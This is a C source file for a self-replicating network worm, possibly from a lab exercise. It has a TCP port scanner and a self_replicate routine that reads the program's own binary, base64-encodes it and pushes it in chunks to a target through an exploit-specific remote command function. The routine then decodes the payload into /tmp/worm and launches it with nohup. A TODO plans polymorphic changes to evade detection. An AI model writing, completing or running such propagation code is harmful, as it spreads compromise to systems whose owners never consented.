#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <limits.h>
#include <fcntl.h>

// Configuration
#define CHUNK_SIZE 4000
#define REMOTE_B64_PATH "/tmp/worm.b64"
#define REMOTE_WORM_PATH "/tmp/worm"
#define SCAN_TIMEOUT 2

// Base64 encoding table
static const char base64_table[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * Base64 encode function
 * Returns dynamically allocated string (caller must free)
 */
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    *output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = malloc(*output_length + 1);
    if (!encoded_data) return NULL;
    
    size_t i, j;
    for (i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;
        
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        
        encoded_data[j++] = base64_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 0 * 6) & 0x3F];
    }
    
    // Add padding
    for (i = 0; i < (3 - input_length % 3) % 3; i++) {
        encoded_data[*output_length - 1 - i] = '=';
    }
    
    encoded_data[*output_length] = '\0';
    return encoded_data;
}

/**
 * Get the path to the current executable
 * Returns dynamically allocated string (caller must free)
 */
char* get_executable_path(const char* argv0) {
    char* path = malloc(PATH_MAX);
    if (!path) return NULL;
    
    // Try /proc/self/exe first (Linux)
    ssize_t len = readlink("/proc/self/exe", path, PATH_MAX - 1);
    if (len != -1) {
        path[len] = '\0';
        return path;
    }
    
    // Fallback: use argv[0] if available
    if (argv0) {
        // If it's an absolute path, use it directly
        if (argv0[0] == '/') {
            return strdup(argv0);
        }
        // Otherwise, try to resolve it (simplified - just return as-is)
        return strdup(argv0);
    }
    
    free(path);
    return NULL;
}

/**
 * Scan target IP for specified port
 * Returns 1 if port is open, 0 otherwise
 */
int scan_port(const char* ip, int port, int timeout_sec) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return 0;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        close(sock);
        return 0;
    }
    
    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = timeout_sec;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    int result = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    close(sock);
    
    return (result == 0) ? 1 : 0;
}

/**
 * Self-replicate to target
 * execute_cmd_func: Function pointer to execute commands on target (CVE-specific)
 * Returns 1 on success, 0 on failure
 */
int self_replicate(const char* target_ip, const char* argv0, 
                   const char* remote_path,
                   int (*execute_cmd_func)(const char* ip, const char* command)) {
    if (!execute_cmd_func) {
        return 0;
    }
    
    // 1. Read own binary
    char* exe_path = get_executable_path(argv0);
    if (!exe_path) {
        exe_path = strdup("/proc/self/exe");
    }
    
    FILE* f = fopen(exe_path, "rb");
    if (!f) {
        free(exe_path);
        return 0;
    }
    
    // Get file size
    fseek(f, 0, SEEK_END);
    long file_size_long = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size_long < 0) {
        fclose(f);
        free(exe_path);
        return 0;
    }
    
    size_t file_size = (size_t)file_size_long;
    
    // Read file
    unsigned char* worm_content = malloc(file_size);
    if (!worm_content) {
        fclose(f);
        free(exe_path);
        return 0;
    }
    
    size_t bytes_read = fread(worm_content, 1, file_size, f);
    fclose(f);
    free(exe_path);
    
    if (bytes_read != file_size) {
        free(worm_content);
        return 0;
    }
    
    // TODO: function polimorfism(): add random bytes to make the worm code change 
    // without changing the functionality. And maybe can add more lab techniques 
    // to make it more complex
    // worm_content = polimorfism(worm_content) -> to be done
    
    // 2. Base64 encode
    size_t b64_len;
    char* b64_content = base64_encode(worm_content, file_size, &b64_len);
    free(worm_content);
    
    if (!b64_content) {
        return 0;
    }
    
    // 3. Check if already infected
    char check_cmd[512];
    snprintf(check_cmd, sizeof(check_cmd), 
        "echo 'Content-type: text/plain'; echo; /bin/ls %s", remote_path);
    
    // Note: execute_cmd_func should return non-zero on success
    // For now, we'll skip the check and proceed
    
    // 4. Upload in chunks
    for (size_t i = 0; i < b64_len; i += CHUNK_SIZE) {
        size_t chunk_len = (i + CHUNK_SIZE < b64_len) ? CHUNK_SIZE : (b64_len - i);
        char* chunk = malloc(chunk_len + 1);
        if (!chunk) continue;
        
        memcpy(chunk, b64_content + i, chunk_len);
        chunk[chunk_len] = '\0';
        
        // Escape special characters for shell command
        char* escaped_chunk = malloc(chunk_len * 2 + 1);
        if (escaped_chunk) {
            size_t j = 0;
            for (size_t k = 0; k < chunk_len; k++) {
                if (chunk[k] == '\'') {
                    escaped_chunk[j++] = '\'';
                    escaped_chunk[j++] = '\\';
                    escaped_chunk[j++] = '\'';
                    escaped_chunk[j++] = '\'';
                } else {
                    escaped_chunk[j++] = chunk[k];
                }
            }
            escaped_chunk[j] = '\0';
            
            char cmd[8192];
            snprintf(cmd, sizeof(cmd), "/bin/echo -n '%s' >> %s", escaped_chunk, REMOTE_B64_PATH);
            execute_cmd_func(target_ip, cmd);
            
            free(escaped_chunk);
        }
        
        free(chunk);
    }
    
    // 5. Decode
    char decode_cmd[512];
    snprintf(decode_cmd, sizeof(decode_cmd), 
        "/usr/bin/base64 -d %s > %s", REMOTE_B64_PATH, remote_path);
    execute_cmd_func(target_ip, decode_cmd);
    
    // 6. Execute
    char exec_cmd[512];
    snprintf(exec_cmd, sizeof(exec_cmd), 
        "nohup %s > /tmp/worm.log 2>&1 &", remote_path);
    execute_cmd_func(target_ip, exec_cmd);
    
    free(b64_content);
    return 1;
}

